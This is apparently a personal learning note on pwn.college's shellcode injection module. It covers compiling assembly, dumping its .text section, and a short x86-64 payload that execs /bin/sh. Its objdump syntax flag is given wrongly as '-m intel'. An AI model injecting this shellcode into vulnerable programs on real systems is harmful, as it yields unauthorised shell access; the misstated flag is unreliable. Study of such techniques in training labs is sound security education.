---
date: 2024-01-28
topic: pwn.college - shellcode injection
tags: technical, shellcode, pwn.college, assembly, security, injection, low-level
---

# Brief

In [pwn.college](https://pwn.college/), I'm currently learning about [shellcode injection](https://pwn.college/program-security/shellcode-injection).

# What I Learned

## pwn.college - Shellcode Injection

* you can compile assembly code using `gcc -nostdlib -static <assembly_file> -o <object_file>`.
* then we can disassemble the object file using `objdump -d <object_file>`. you can specify the architecture using `-m <arch>` option. for example I'm using untel syntax, so I need to specify the architecture using `-m intel`.
* then to get the shellcode, we can use `objcopy` command: `objcopy --dump-section .text=<output_file> <object_file>`.
* to view the hexdump of the shellcode, we can use `hd <output_file>`.
* this is the example for executing `/bin/sh` using shellcode:

```asm
.global _start
_start:
.intel_syntax noprefix
    mov rax, 59
    lea rdi, [rip+binsh]
    mov rsi, 0
    mov rdx, 0
    syscall
binsh:
    .string "/bin/sh"
```

# Ideas to Explore in the Future

-
